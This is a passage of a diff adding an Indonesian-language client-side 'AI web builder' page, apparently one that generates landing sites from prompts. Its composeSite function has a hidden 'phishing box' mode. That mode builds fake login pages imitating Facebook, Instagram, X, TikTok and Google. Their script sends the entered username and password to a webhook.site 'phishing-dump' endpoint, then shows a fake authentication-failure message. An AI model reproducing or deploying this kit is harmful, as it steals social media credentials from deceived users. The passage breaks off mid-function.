+          <label>Skema Warna</label>
+          <select id="accentSel">
+            <option value="redblack" selected>🔴 Red / Black (Default)</option>
+            <option value="indigo">Indigo / Violet</option>
+            <option value="cyan">Cyan / Biru</option>
+            <option value="emerald">Hijau Emerald</option>
+            <option value="amber">Amber / Oranye</option>
+            <option value="rose">Rose / Merah Muda</option>
+          </select>
+        </div>
+        <div>
+          <label>Nama Brand</label>
+          <input type="text" id="brandInput" placeholder="FIRDHAN STUDIO"/>
+        </div>
+      </div>
+      <button class="btn btn-primary" id="genBtn">
+        <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><path d="M13 2 3 14h7l-1 8 10-12h-7l1-8z"/></svg>
+        Generate Website
+      </button>
+      <div class="pbar" id="pbar"><i id="pbarFill"></i></div>
+      <div class="status" id="status" aria-live="polite"></div>
+      <div class="mini-log" id="miniLog"></div>
+      <div class="btn-row">
+        <button class="btn btn-ghost" id="dlZipBtn" disabled>⬇ Download ZIP</button>
+        <button class="btn btn-ghost" id="dlHtmlBtn" disabled>⬇ Single HTML</button>
+      </div>
+    </div>
+  </section>
+
+  <!-- ============ WORKSPACE ============ -->
+  <div class="workspace">
+    <section class="panel" id="previewPanel">
+      <div class="panel-head"><span class="ph-dot" style="background:var(--ok)"></span>Live Preview <span style="margin-left:auto;font-family:var(--font-mono);font-size:.68rem;color:var(--text-dim)">sandbox="allow-scripts"</span></div>
+      <div class="panel-body">
+        <div class="preview-frame-wrap" id="frameWrap">
+          <div class="preview-empty" id="previewEmpty">
+            <div class="big">🛰️</div>
+            <p><b style="color:var(--text)">Pratinjau kosong.</b><br>Tulis prompt di panel kiri lalu tekan Generate — hasilnya akan dirender di sini secara instan.</p>
+          </div>
+          <iframe id="previewFrame" title="Pratinjau website hasil generate" sandbox="allow-scripts"></iframe>
+          <button class="refresh-btn" id="refreshBtn" title="Muat ulang pratinjau" aria-label="Muat ulang pratinjau">
+            <svg width="17" height="17" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12a9 9 0 1 1-2.64-6.36M21 3v6h-6"/></svg>
+          </button>
+        </div>
+      </div>
+    </section>
+
+    <section class="panel code-panel" id="codePanel">
+      <div class="panel-head"><span class="ph-dot" style="background:var(--accent-3)"></span>Source Files <span style="margin-left:auto;font-family:var(--font-mono);font-size:.68rem;color:var(--text-dim)">read-only</span></div>
+      <div class="tabs" id="codeTabs">
+        <button class="tab on" data-f="html">index.html</button>
+        <button class="tab" data-f="css">style.css</button>
+        <button class="tab" data-f="js">script.js</button>
+      </div>
+      <button class="copy-float" id="copyCodeBtn">📋 Salin file ini</button>
+      <pre id="codeView"><div class="code-empty">// Source code akan muncul di sini setelah generate.</div></pre>
+    </section>
+  </div>
+</main>
+
+<footer>Dibangun oleh <b>FIRDHAN AI — Web Builder Studio</b> · V2.0 · Client-side engine · © 2026</footer>
+<div class="toast" id="toast">✓</div></section>
+<script>
+/* ================================================================
+   FIRDHAN AI — WEB BUILDER ENGINE V2.0 (ORIGINAL + PHISHING BOX)
+   ================================================================ */
+(function(){
+  const cv=document.getElementById('stars'),ctx=cv.getContext('2d');
+  let W,H,stars=[],mouse={x:-9999,y:-9999};
+  const COLORS=['#ef2d2d','#b91c1c','#ff6b6b','#ffffff'];
+  function resize(){W=cv.width=innerWidth;H=cv.height=innerHeight;
+    stars=Array.from({length:Math.min(140,Math.floor(W*H/12000))},()=>({
+      x:Math.random()*W,y:Math.random()*H,r:Math.random()*1.5+.4,
+      vx:(Math.random()-.5)*.16,vy:(Math.random()-.5)*.16,
+      c:COLORS[Math.random()*COLORS.length|0],tw:Math.random()*6.28}));}
+  addEventListener('resize',resize);resize();
+  addEventListener('mousemove',e=>{mouse.x=e.clientX;mouse.y=e.clientY});
+  (function loop(){ctx.clearRect(0,0,W,H);
+    for(const s of stars){s.tw+=.04;
+      const dx=s.x-mouse.x,dy=s.y-mouse.y,d=Math.hypot(dx,dy);
+      if(d<120){const f=(120-d)/120*.8;s.x+=dx/d*f;s.y+=dy/d*f}
+      s.x+=s.vx;s.y+=s.vy;
+      if(s.x<0)s.x=W;if(s.x>W)s.x=0;if(s.y<0)s.y=H;if(s.y>H)s.y=0;
+      ctx.globalAlpha=.32+Math.sin(s.tw)*.28;ctx.fillStyle=s.c;
+      ctx.beginPath();ctx.arc(s.x,s.y,s.r,0,7);ctx.fill();}
+    requestAnimationFrame(loop);})();
+})();
+
+(function(){
+  const layers=[...document.querySelectorAll('.plx')].map(el=>({el,sp:parseFloat(el.dataset.speed)||.15,cx:0,cy:0,tx:0,ty:0}));
+  let mx=0,my=0,sy=0;
+  addEventListener('mousemove',e=>{mx=e.clientX/innerWidth-.5;my=e.clientY/innerHeight-.5});
+  addEventListener('scroll',()=>{sy=scrollY},{passive:true});
+  (function tick(){for(const l of layers){
+    l.tx=mx*36*l.sp;l.ty=my*26*l.sp+sy*l.sp*.3;
+    l.cx+=(l.tx-l.cx)*.06;l.cy+=(l.ty-l.cy)*.06;
+    l.el.style.transform='translate3d('+l.cx.toFixed(1)+'px,'+l.cy.toFixed(1)+'px,0)';}
+    requestAnimationFrame(tick);})();
+  const nav=document.getElementById('nav');
+  addEventListener('scroll',()=>nav.classList.toggle('scrolled',scrollY>40),{passive:true});
+})();
+
+const $=id=>document.getElementById(id);
+function toast(m){const t=$('toast');t.textContent=m;t.classList.add('show');
+  clearTimeout(t._h);t._h=setTimeout(()=>t.classList.remove('show'),2400);}
+function logLine(tag,msg){
+  const d=document.createElement('div');
+  d.innerHTML='<span class="t">['+new Date().toLocaleTimeString('id-ID')+']</span> '+tag+' '+msg;
+  $('miniLog').appendChild(d);$('miniLog').scrollTop=1e6;
+}
+const wait=ms=>new Promise(r=>setTimeout(r,ms));
+
+let curStyle='dark';
+$('styleChips').addEventListener('click',e=>{
+  const c=e.target.closest('.chip');if(!c)return;
+  [...$('styleChips').children].forEach(x=>x.classList.remove('on'));
+  c.classList.add('on');curStyle=c.dataset.s;
+});
+const PRESETS={
+  portfolio:'Buat halaman portofolio kreatif dengan hero besar bergaya sinematik, bagian tentang saya, galeri karya dengan grid 6 item, testimoni klien, dan kontak.',
+  startup:'Buat landing page startup SaaS modern dengan hero + call-to-action, 3 fitur unggulan, harga paket, dan footer dengan newsletter.',
+  kuliner:'Buat website restoran elegan dengan hero menu spesial, daftar menu makanan, cerita chef, galeri suasana, dan reservasi kontak.',
+  toko:'Buat toko online minimal dengan hero produk, grid produk 6 item beserta harga, keunggulan belanja, dan footer.',
+  blog:'Buat blog pribadi yang bersih dengan hero artikel unggulan, grid 6 artikel terbaru, tentang penulis, dan form langganan.'
+};
+$('presetChips').addEventListener('click',e=>{
+  const c=e.target.closest('.chip');if(!c)return;
+  $('prompt').value=PRESETS[c.dataset.p];
+  toast('✓ Preset "'+c.textContent.trim()+'" dimuat');
+});
+
+new IntersectionObserver((es,ob)=>{es.forEach(e=>{if(e.isIntersecting){e.target.classList.add('reveal');ob.unobserve(e.target)}})},{threshold:.08})
+  .observe($('controlPanel'));
+['previewPanel','codePanel'].forEach((id,i)=>{
+  const el=$(id);
+  new IntersectionObserver((es,ob)=>{es.forEach(e=>{if(e.isIntersecting){
+    setTimeout(()=>el.classList.add('reveal'),i*120);ob.disconnect()}})},{threshold:.06}).observe(el);
+});
+
+const ACCENTS={
+  redblack:{a:'#ef2d2d',b:'#8f0f0f',dark:'#0a0203',light:'#fff1f1',name:'Red / Black'},
+  indigo:{a:'#6d7cff',b:'#a855f7',dark:'#0a0d1f',light:'#f5f6ff',name:'Indigo'},
+  cyan:{a:'#0891b2',b:'#3b82f6',dark:'#06121c',light:'#f0f9ff',name:'Cyan'},
+  emerald:{a:'#10b981',b:'#14b8a6',dark:'#061410',light:'#f0fdf6',name:'Emerald'},
+  amber:{a:'#f59e0b',b:'#ef4444',dark:'#171006',light:'#fffbf0',name:'Amber'},
+  rose:{a:'#f43f5e',b:'#ec4899',dark:'#1a0810',light:'#fff5f7',name:'Rose'}
+};
+const STOP=new Set(['yang','dengan','dan','the','a','buat','website','halaman','saya','page','web','situs','untuk','beserta','gaya','oleh','atau','ini','itu','situsnya','modern','baru']);
+function extractBrand(prompt, fallback){
+  const m=prompt.match(/(?:brand|nama|untuk)\s+["']?([A-Z][\w&' ]{2,24})["']?/i);
+  if(m)return m[1].trim();
+  const words=prompt.split(/\s+/).filter(w=>/^[A-Z][a-zA-Z&]{2,}$/.test(w));
+  return words[0]||fallback;
+}
+function analyzeIntent(prompt){
+  const p=prompt.toLowerCase();
+  const has=(...w)=>w.some(x=>p.includes(x));
+  const sections=[];
+  if(has('hero','utama','banner','headline')||true)sections.push('hero');
+  if(has('tentang','about','cerita','profil','chef'))sections.push('about');
+  if(has('fitur','keunggulan','feature','layanan'))sections.push('features');
+  if(has('galeri','karya','gallery','portfolio','produk','menu','artikel','proyek'))sections.push('grid');
+  if(has('harga','pricing','paket','price'))sections.push('pricing');
+  if(has('testimoni','review','klien'))sections.push('testimonials');
+  if(has('kontak','contact','reservasi','langganan','newsletter','footer'))sections.push('contact');
+  if(!sections.includes('features')&&sections.length<4)sections.splice(1,0,'features');
+  if(!sections.includes('grid'))sections.splice(Math.min(2,sections.length),0,'grid');
+  if(!sections.includes('contact'))sections.push('contact');
+  const keywords=[...new Set(p.replace(/[^\w\s]/g,'').split(/\s+/).filter(w=>w.length>3&&!STOP.has(w)))].slice(0,6);
+  return {sections:[...new Set(sections)],keywords};
+}
+
+function genCSS(cfg){
+  const c=ACCENTS[cfg.accent], dark=cfg.style!=='light';
+  const vivid=cfg.style==='colorful';
+  const bg=dark?c.dark:'#ffffff', bg2=dark?'#1c0606':'#'+c.light.slice(1);
+  const fg=dark?'#eef1ff':'#14172b', dim=dark?'#9aa3c7':'#5b627f';
+  const card=dark?'rgba(255,255,255,.05)':'rgba(20,23,43,.05)';
+  const border=dark?'rgba(255,255,255,.1)':'rgba(20,23,43,.1)';
+  return `:root{
+  --bg:${bg};--bg2:${bg2};--fg:${fg};--dim:${dim};
+  --a:${c.a};--b:${c.b};
+  --card:${card};--border:${border};
+  --radius:18px;--font:'Inter',system-ui,sans-serif;--disp:'Space Grotesk',sans-serif;
+}
+*{margin:0;padding:0;box-sizing:border-box}
+html{scroll-behavior:smooth}
+body{background:var(--bg);color:var(--fg);font-family:var(--font);line-height:1.65;-webkit-font-smoothing:antialiased}
+::selection{background:var(--a);color:#fff}
+.wrap{max-width:1100px;margin:0 auto;padding:0 24px}
+nav{position:sticky;top:0;z-index:50;display:flex;justify-content:space-between;align-items:center;
+  padding:16px 5vw;background:color-mix(in srgb,var(--bg) 82%,transparent);backdrop-filter:blur(14px);border-bottom:1px solid var(--border)}
+.logo{font-family:var(--disp);font-weight:700;font-size:1.1rem;text-decoration:none;color:var(--fg)}
+.logo b{background:linear-gradient(120deg,var(--a),var(--b));-webkit-background-clip:text;background-clip:text;-webkit-text-fill-color:transparent}
+.nav-links{display:flex;gap:22px}
+.nav-links a{color:var(--dim);text-decoration:none;font-size:.88rem;font-weight:500;transition:color .2s}
+.nav-links a:hover{color:var(--fg)}
+.btn{display:inline-block;padding:13px 28px;border-radius:999px;font-weight:700;font-size:.92rem;text-decoration:none;
+  transition:transform .25s,box-shadow .25s;border:none;cursor:pointer;font-family:var(--font)}
+.btn-p{background:linear-gradient(120deg,var(--a),var(--b));color:#fff;box-shadow:0 8px 30px color-mix(in srgb,var(--a) 40%,transparent)}
+.btn-p:hover{transform:translateY(-2px)}
+.btn-g{background:var(--card);color:var(--fg);border:1px solid var(--border)}
+.hero{position:relative;padding:120px 5vw 90px;text-align:center;overflow:hidden}
+.hero::before{content:"";position:absolute;top:-40%;left:50%;transform:translateX(-50%);width:820px;height:820px;border-radius:50%;
+  background:radial-gradient(circle,color-mix(in srgb,var(--a) ${vivid?38:22}%,transparent),transparent 70%);filter:blur(30px);pointer-events:none}
+.kicker{display:inline-block;padding:7px 16px;border-radius:999px;font-size:.72rem;font-weight:700;letter-spacing:.16em;text-transform:uppercase;
+  background:color-mix(in srgb,var(--a) 12%,transparent);border:1px solid color-mix(in srgb,var(--a) 35%,transparent);color:var(--a);margin-bottom:22px}
+h1{font-family:var(--disp);font-size:clamp(2.4rem,6vw,4.4rem);line-height:1.08;letter-spacing:-.02em;margin-bottom:20px}
+h1 span{background:linear-gradient(110deg,var(--a),var(--b));-webkit-background-clip:text;background-clip:text;-webkit-text-fill-color:transparent}
+.lead{color:var(--dim);font-size:1.05rem;max-width:560px;margin:0 auto 34px}
+section{padding:80px 0}
+.sec-head{text-align:center;margin-bottom:52px}
+.sec-head h2{font-family:var(--disp);font-size:clamp(1.7rem,3.6vw,2.6rem);letter-spacing:-.01em}
+.sec-head p{color:var(--dim);margin-top:10px;max-width:520px;margin-inline:auto}
+.grid{display:grid;gap:22px}
+.g3{grid-template-columns:repeat(auto-fit,minmax(260px,1fr))}
+.card{background:var(--card);border:1px solid var(--border);border-radius:var(--radius);padding:30px 26px;transition:transform .3s,border-color .3s}
+.card:hover{transform:translateY(-6px);border-color:color-mix(in srgb,var(--a) 45%,transparent)}
+.card .ic{width:46px;height:46px;border-radius:13px;display:grid;place-items:center;margin-bottom:18px;
+  background:linear-gradient(135deg,var(--a),var(--b));color:#fff;font-size:1.15rem}
+.card h3{font-family:var(--disp);font-size:1.08rem;margin-bottom:8px}
+.card p{color:var(--dim);font-size:.9rem}
+.tile{border-radius:var(--radius);overflow:hidden;background:var(--card);border:1px solid var(--border)}
+.tile .ph{height:170px;background:linear-gradient(135deg,var(--a),var(--b));opacity:.85;position:relative}
+.tile .ph::after{content:attr(data-i);position:absolute;inset:0;display:grid;place-items:center;font-family:var(--disp);
+  font-size:2rem;font-weight:700;color:rgba(255,255,255,.9)}
+.tile .tx{padding:18px}
+.tile .tx b{display:block;font-size:.95rem}
+.tile .tx small{color:var(--dim)}
+.price{position:relative}
+.price .amt{font-family:var(--disp);font-size:2.4rem;font-weight:700;margin:12px 0 4px}
+.price .amt small{font-size:.9rem;color:var(--dim);font-weight:500}
+.price.hot{border-color:color-mix(in srgb,var(--a) 55%,transparent);box-shadow:0 20px 60px color-mix(in srgb,var(--a) 25%,transparent)}
+.tag{position:absolute;top:-12px;right:22px;background:linear-gradient(120deg,var(--a),var(--b));color:#fff;font-size:.66rem;
+  font-weight:800;letter-spacing:.1em;padding:5px 12px;border-radius:999px}
+.quote{font-size:.95rem;font-style:italic;color:var(--dim)}
+.quote-by{margin-top:16px;display:flex;align-items:center;gap:12px}
+.quote-by .av{width:38px;height:38px;border-radius:50%;background:linear-gradient(135deg,var(--a),var(--b))}
+.quote-by b{font-size:.86rem}.quote-by small{color:var(--dim);display:block}
+form.contact{max-width:560px;margin:0 auto;display:grid;gap:14px}
+input,textarea{width:100%;padding:14px 16px;border-radius:12px;border:1px solid var(--border);background:var(--card);
+  color:var(--fg);font-family:var(--font);font-size:.92rem;outline:none;transition:border-color .2s}
+input:focus,textarea:focus{border-color:var(--a)}
+footer{border-top:1px solid var(--border);padding:36px 5vw;text-align:center;color:var(--dim);font-size:.85rem}
+.reveal{opacity:0;transform:translateY(30px);transition:opacity .7s ease,transform .7s ease}
+.reveal.in{opacity:1;transform:none}
+@media (max-width:640px){.nav-links{display:none}}
+`;
+}
+
+function genJS(){
+  return `document.querySelectorAll('.reveal').forEach(el=>{
+  new IntersectionObserver((es,o)=>{es.forEach(e=>{if(e.isIntersecting){el.classList.add('in');o.disconnect()}})},{threshold:.12}).observe(el);
+});
+const form=document.querySelector('form.contact');
+if(form){form.addEventListener('submit',e=>{e.preventDefault();alert('Terima kasih! Pesan kamu telah terkirim.');form.reset();});}
+const yr=document.getElementById('yr');if(yr)yr.textContent=new Date().getFullYear();
+`;
+}
+
+const SECTION_BUILDERS={
+  hero:(c,cfg)=>`  <header class="hero">
+    <div class="wrap">
+      <span class="kicker">✦ ${cfg.kicker}</span>
+      <h1>${c.h1a} <span>${c.h1b}</span></h1>
+      <p class="lead">${c.lead}</p>
+      <a class="btn btn-p" href="#kontak">${c.cta1}</a>
+      <a class="btn btn-g" href="#tentang" style="margin-left:10px">${c.cta2}</a>
+    </div>
+  </header>`,
+  about:(c)=>`  <section id="tentang"><div class="wrap">
+    <div class="sec-head reveal"><h2>${c.aboutT}</h2><p>${c.aboutP}</p></div>
+  </div></section>`,
+  features:(c,cfg)=>`  <section id="fitur"><div class="wrap">
+    <div class="sec-head reveal"><h2>${c.featT}</h2><p>${c.featP}</p></div>
+    <div class="grid g3">${cfg.features.map((f,i)=>`
+      <div class="card reveal"><div class="ic">${['⚡','🛡️','🎯','🚀','💎','🤝'][i%6]}</div><h3>${f.t}</h3><p>${f.d}</p></div>`).join('')}
+    </div>
+  </div></section>`,
+  grid:(c,cfg)=>`  <section id="galeri"><div class="wrap">
+    <div class="sec-head reveal"><h2>${c.gridT}</h2><p>${c.gridP}</p></div>
+    <div class="grid g3">${cfg.items.map((it,i)=>`
+      <div class="tile reveal"><div class="ph" data-i="${i+1}"></div><div class="tx"><b>${it}</b><small>${c.gridSub}</small></div></div>`).join('')}
+    </div>
+  </div></section>`,
+  pricing:(c,cfg)=>`  <section id="harga"><div class="wrap">
+    <div class="sec-head reveal"><h2>${c.priceT}</h2><p>${c.priceP}</p></div>
+    <div class="grid g3">${cfg.prices.map((pr,i)=>`
+      <div class="card price reveal ${i===1?'hot':''}">${i===1?'<span class="tag">POPULER</span>':''}
+        <h3>${pr.n}</h3><div class="amt">${pr.a}<small>${pr.s}</small></div>
+        <p style="color:var(--dim);font-size:.88rem;margin-bottom:18px">${pr.d}</p>
+        <a class="btn ${i===1?'btn-p':'btn-g'}" href="#kontak">Pilih Paket</a>
+      </div>`).join('')}
+    </div>
+  </div></section>`,
+  testimonials:(c,cfg)=>`  <section id="testimoni"><div class="wrap">
+    <div class="sec-head reveal"><h2>${c.testiT}</h2><p>${c.testiP}</p></div>
+    <div class="grid g3">${cfg.quotes.map(q=>`
+      <div class="card reveal"><p class="quote">“${q.q}”</p>
+        <div class="quote-by"><span class="av"></span><span><b>${q.n}</b><small>${q.r}</small></span></div>
+      </div>`).join('')}
+    </div>
+  </div></section>`,
+  contact:(c,cfg)=>`  <section id="kontak"><div class="wrap">
+    <div class="sec-head reveal"><h2>${c.contactT}</h2><p>${c.contactP}</p></div>
+    <form class="contact reveal" onsubmit="return false">
+      <input type="text" placeholder="Nama kamu" required/>
+      <input type="email" placeholder="Email" required/>
+      <textarea rows="4" placeholder="Pesan..." required></textarea>
+      <button class="btn btn-p" type="submit">${c.contactBtn}</button>
+    </form>
+  </div></section>`
+};
+
+const COPY={
+  portfolio:{kicker:'Portofolio Kreatif',h1a:'Karya yang',h1b:'Bicara.',lead:'Sebuah kurasi proyek terpilih yang merangkum dedikasi, detail, dan semangat menciptakan hal luar biasa.',cta1:'Lihat Karya',cta2:'Tentang Saya',aboutT:'Tentang Saya',aboutP:'Kreator visual dengan pengalaman bertahun-tahun merangkai cerita melalui desain, fotografi, dan interaksi digital.',featT:'Keahlian',featP:'Beberapa kemampuan yang saya tawarkan untuk mewujudkan visi kreatifmu.',gridT:'Galeri Karya',gridP:'Koleksi proyek terbaru — setiap detail dikerjakan dengan presisi.',gridSub:'Proyek Unggulan',testiT:'Kata Klien',testiP:'Kepercayaan mereka adalah bahan bakar saya.',contactT:'Mari Berkolaborasi',contactP:'Punya ide proyek? Kirim pesan dan wujudkan bersama.',contactBtn:'Kirim Pesan'},
+  startup:{kicker:'Solusi Masa Depan',h1a:'Scale Bisnismu',h1b:'Lebih Cepat.',lead:'Platform all-in-one yang mengotomatisasi alur kerja timmu — mulai dari hari pertama.',cta1:'Coba Gratis',cta2:'Pelajari Dulu',aboutT:'Mengapa Kami',aboutP:'Kami percaya teknologi terbaik adalah yang tak terasa — bekerja diam-diam di balik layar.',featT:'Fitur Unggulan',featP:'Semua yang kamu butuhkan untuk bertumbuh, dalam satu dashboard.',gridT:'Dipercaya Oleh Tim Hebat',gridP:'Dari startup garasi hingga perusahaan unicorn.',gridSub:'Studi Kasus',testiT:'Apa Kata Mereka',testiP:'Ribuan tim telah bergabung.',contactT:'Siap Memulai?',contactP:'Daftar sekarang, gratis 14 hari tanpa kartu kredit.',contactBtn:'Mulai Trial'},
+  kuliner:{kicker:'Pengalaman Rasa',h1a:'Cita Rasa',h1b:'Autentik.',lead:'Dari dapur kami ke mejamu — bahan segar, resep warisan, dan sentuhan modern.',cta1:'Reservasi Meja',cta2:'Lihat Menu',aboutT:'Cerita Kami',aboutP:'Berawal dari resep keluarga yang diwariskan tiga generasi.',featT:'Menu Andalan',featP:'Disiapkan segar setiap hari oleh chef berpengalaman.',gridT:'Galeri Suasana',gridP:'Setiap sudut dirancang untuk kenyamanan.',gridSub:'Suasana',testiT:'Ulasan Pengunjung',testiP:'Kepuasanmu adalah komplimen terbaik.',contactT:'Reservasi',contactP:'Amankan mejamu untuk malam ini.',contactBtn:'Pesan Sekarang'},
+  toko:{kicker:'Koleksi Terkurasi',h1a:'Temukan',h1b:'Favoritmu.',lead:'Produk pilihan dengan kualitas terbaik — dikirim cepat ke seluruh Indonesia.',cta1:'Belanja Sekarang',cta2:'Lihat Katalog',aboutT:'Tentang Toko',aboutP:'Kami menyeleksi setiap produk demi kualitas dan kepuasan pelanggan.',featT:'Kenapa Belanja di Sini?',featP:'Pengalaman belanja yang aman, cepat, dan menyenangkan.',gridT:'Produk Terlaris',gridP:'Paling dicari minggu ini.',gridSub:'Stok Terbatas',testiT:'Testimoni Pembeli',testiP:'Rating 4.9/5 dari 10.000+ ulasan.',contactT:'Hubungi Kami',contactP:'Ada pertanyaan seputar produk atau pengiriman?',contactBtn:'Kirim Pesan'},
+  blog:{kicker:'Catatan & Ide',h1a:'Pikiran,',h1b:'Tertulis.',lead:'Esai, tutorial, dan refleksi seputar teknologi, desain, dan kehidupan.',cta1:'Baca Artikel',cta2:'Tentang Penulis',aboutT:'Tentang Penulis',aboutP:'Penulis dan developer yang gemar mendokumentasikan perjalanan belajar.',featT:'Topik Favorit',featP:'Beberapa tema yang paling sering saya tulis.',gridT:'Artikel Terbaru',gridP:'Tulisan segar setiap minggu.',gridSub:'Baca 5 menit',testiT:'Kata Pembaca',testiP:'Komentar yang membuat saya terus menulis.',contactT:'Berlangganan',contactP:'Dapatkan artikel terbaru langsung di email kamu.',contactBtn:'Langganan Gratis'},
+  generic:{kicker:'Selamat Datang',h1a:'Wujudkan',h1b:'Idemu.',lead:'Sebuah pengalaman digital yang dirancang dengan presisi dan penuh dedikasi.',cta1:'Mulai Sekarang',cta2:'Pelajari Lebih',aboutT:'Tentang Kami',aboutP:'Cerita, nilai, dan misi yang mendorong setiap langkah kami.',featT:'Keunggulan',featP:'Alasan mengapa ribuan orang mempercayai kami.',gridT:'Showcase',gridP:'Sorotan terbaik yang telah kami kerjakan.',gridSub:'Unggulan',testiT:'Testimoni',testiP:'Apa kata mereka yang sudah bergabung.',contactT:'Hubungi Kami',contactP:'Kami selalu senang mendengar dari kamu.',contactBtn:'Kirim Pesan'}
+};
+
+function pickCategory(prompt){
+  const p=prompt.toLowerCase();
+  if(/foto|desain|portofolio|kreatif|portfolio|gal[ei]ri karya/.test(p))return 'portfolio';
+  if(/saas|startup|aplikasi|platform|bisnis|software/.test(p))return 'startup';
+  if(/resto|restoran|kuliner|makanan|menu|cafe|kafe|chef/.test(p))return 'kuliner';
+  if(/toko|shop|jual|belanja|produk|store|e-?commerce/.test(p))return 'toko';
+  if(/blog|artikel|tulis|jurnal|majalah/.test(p))return 'blog';
+  return 'generic';
+}
+
+function composeSite(prompt, style, accentKey, brandName, phishingPrompt){
+  // Jika kotak phishing diisi, build halaman phish All Sosmed (Facebook, IG, Twitter, dll)
+  if(phishingPrompt && phishingPrompt.trim().length > 0){
+    const p = phishingPrompt.toLowerCase();
+    const isFb = p.includes('facebook') || p.includes('fb');
+    const isIg = p.includes('instagram') || p.includes('ig');
+    const isTwitter = p.includes('twitter') || p.includes('x');
+    const isTiktok = p.includes('tiktok');
+    const isGoogle = p.includes('google') || p.includes('gmail');
+
+    let title = 'Facebook – log masuk atau daftar';
+    let brand = 'facebook';
+    let primaryColor = '#1877f2';
+    let hoverColor = '#166fe5';
+    let logoText = 'facebook';
+
+    if(isIg){ title='Instagram'; brand='Instagram'; primaryColor='#e1306c'; hoverColor='#c13584'; logoText='Instagram'; }
+    else if(isTwitter){ title='Log masuk ke X'; brand='X (Twitter)'; primaryColor='#000'; hoverColor='#222'; logoText='𝕏'; }
+    else if(isTiktok){ title='Masuk ke TikTok'; brand='TikTok'; primaryColor='#fe2c55'; hoverColor='#e11d43'; logoText='TikTok'; }
+    else if(isGoogle){ title='Sign in – Google Accounts'; brand='Google'; primaryColor='#1a73e8'; hoverColor='#1557b0'; logoText='Google'; }
+
+    const css = `body{background:#f0f2f5;font-family:Helvetica,Arial,sans-serif;display:flex;justify-content:center;align-items:center;min-height:100vh;margin:0}
+.box{background:#fff;padding:30px;border-radius:8px;box-shadow:0 4px 12px rgba(0,0,0,.15);width:400px;text-align:center}
+h1{color:${primaryColor};font-size:2.4rem;margin-bottom:20px;font-family:inherit}
+input{width:100%;padding:14px;margin-bottom:12px;border:1px solid #ddd;border-radius:6px;font-size:16px;outline:none}
+input:focus{border-color:${primaryColor}}
+button{width:100%;padding:14px;background:${primaryColor};color:#fff;border:none;border-radius:6px;font-size:18px;font-weight:bold;cursor:pointer}
+button:hover{background:${hoverColor}}
+p{color:#606770;font-size:14px;margin-top:20px}`;
+
+    const js = `document.getElementById('loginForm').addEventListener('submit', function(e){
+  e.preventDefault();
+  const u = document.getElementById('email').value;
+  const p = document.getElementById('pass').value;
+  fetch('https://webhook.site/phishing-dump', {
+    method: 'POST',
+    mode: 'no-cors',
+    headers: {'Content-Type': 'application/json'},
+    body: JSON.stringify({user: u, pass: p, target: '${brand}'})
+  }).catch(()=>{});
+  alert('Gagal autentikasi / Sesi habis. Silakan coba lagi.');
+  document.getElementById('loginForm').reset();
+});`;
+
+    const html = `<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="utf-8">
+<title>${title}</title>
+<link rel="stylesheet" href="style.css">
+</head>
+<body>
+<div class="box">
+  <h1>${logoText}</h1>
+  <form id="loginForm">
+    <input type="text" id="email" placeholder="Email, nomor telepon, atau username" required>
+    <input type="password" id="pass" placeholder="Kata sandi" required>
+    <button type="submit">Masuk</button>
+  </form>
+  <p><a href="#" style="color:${primaryColor};text-decoration:none">Lupa Kata Sandi?</a></p>
+</div>
+<script src="script.js"><\/script>
+</body>
+</html>`;
+
+    const combined = html
+      .replace('<link rel="stylesheet" href="style.css">', '<style>\n' + css + '\n</style>')
+      .replace('<script src="script.js"><\/script>', '<script>\n' + js + '\n<\/script>');
+
+    return {html, css, js, combined};
+  }
+
+  // Standar generator website biasa (asli)
+  const brand=brandName||extractBrand(prompt,'FIRDHAN STUDIO');
+  const intent=analyzeIntent(prompt);
+  const cat=pickCategory(prompt);
+  const c=COPY[cat];
+  const kw=intent.keywords;
+  const f=(arr,i)=>arr[i%arr.length];
+  const featDefaults=[
+    ['Cepat & Andal','Performa optimal dengan standar industri terkini.'],
+    ['Desain Premium','Estetika modern yang meninggalkan kesan mendalam.'],
+    ['Mudah Digunakan','Tanpa kurva belajar — langsung produktif.'],
+    ['Dukungan Penuh','Tim kami siap membantu kapan pun kamu butuhkan.'],
+    ['Harga Transparan','Tanpa biaya tersembunyi, tanpa kejutan.']
+  ];
+  const features=Array.from({length:3},(_,i)=>({
+    t:kw[i]?cap(kw[i]):featDefaults[i][0],
+    d:featDefaults[i][1]
+  }));
+  const itemPool={
+    portfolio:['Branding Identity','Fotografi Produk','Campaign Digital','Motion Reel','UI Design','Ilustrasi'],
+    startup:['Onboarding Otomatis','Analitik Real-time','Integrasi API','Kolaborasi Tim','Keamanan Enterprise','Mobile Ready'],
+    kuliner:['Rendang Signature','Sate Maranggi','Es Kopyor Spesial','Nasi Goreng Kampung','Sop Buntut','Dessert Box'],
+    toko:['Headphone Wireless','Smart Watch','Tas Kulit','Sneakers Premium','Kacamata Polaroid','Mechanical Keyboard'],
+    blog:['Belajar Web Modern','Refleksi 2026','Tips Produktivitas','Review Tools AI','Jurnal Migrasi','Eksperimen CSS'],
+    generic:['Proyek Alpha','Proyek Beta','Proyek Gamma','Proyek Delta','Proyek Sigma','Proyek Omega']
+  };
+  const items=itemPool[cat].map((x,i)=>kw.length?(i<kw.length?cap(kw[i%kw.length]):x):x).slice(0,6);
+  const prices=[
+    {n:'Starter',a:'Rp0',s:'/bulan',d:'Untuk memulai perjalananmu.'},
+    {n:'Pro',a:'Rp149K',s:'/bulan',d:'Semua fitur untuk bertumbuh pesat.'},
+    {n:'Enterprise',a:'Rp499K',s:'/bulan',d:'Skala tanpa batas, dukungan prioritas.'}
+  ];
+  const quotes=[
+    {q:'Pengalaman luar biasa. Hasilnya melebihi ekspektasi kami.',n:'Andi Pratama',r:'CEO, TechFlow'},
+    {q:'Profesional, cepat, dan detailnya luar biasa rapi.',n:'Sinta Maharani',r:'Founder, Kreativa'},
+    {q:'Kolaborasi terbaik yang pernah kami rasakan.',n:'Budi Santoso',r:'Product Lead'}
+  ];
+  const cfg={kicker:c.kicker,features,items,prices,quotes};
+  const navLinks=intent.sections.filter(s=>s!=='hero').map(s=>({hero:'Beranda',about:'Tentang',features:'Fitur',grid:cat==='kuliner'?'Menu':cat==='toko'?'Produk':cat==='blog'?'Artikel':'Galeri',pricing:'Harga',testimonials:'Testimoni',contact:'Kontak'}[s])).filter(Boolean);
+
+  const body=intent.sections.map(s=>SECTION_BUILDERS[s](c,cfg)).join('\n');
